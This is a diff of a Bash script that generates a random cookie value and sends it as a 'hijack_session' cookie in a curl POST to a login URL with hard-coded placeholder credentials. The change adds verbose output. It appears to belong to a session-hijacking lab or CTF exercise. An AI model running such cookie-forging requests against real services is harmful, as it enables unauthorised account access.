@@ -55,11 +55,12 @@ echo -e "\n--- Generating Random Cookie ---"
 random_cookie=$(echo "$pattern" | sed 's/?/$(tr -dc "a-zA-Z0-9" < /dev/urandom | head -c 1)/ge')
 echo "Generated cookie: $random_cookie"
 
-# Run the POST command
-echo -e "\n--- Executing POST Request ---"
-response=$(curl -X POST -b "hijack_session=$random_cookie" \
-    "$LOGIN_URL" \
-    -d '{"email": "pepe@pepe.com", "password": "halal"}')
+# Run the POST command with verbose output
+echo -e "\n--- Executing POST Request with Verbose Output ---"
+response=$(curl -v -X POST -b "hijack_session=$random_cookie" \
+    -H "Content-Type: application/json" \
+    -d '{"email": "pepe@pepe.com", "password": "halal"}' \
+    "$LOGIN_URL" 2>&1)
 
 echo -e "\n--- Response from Login URL ---"
 echo "$response"
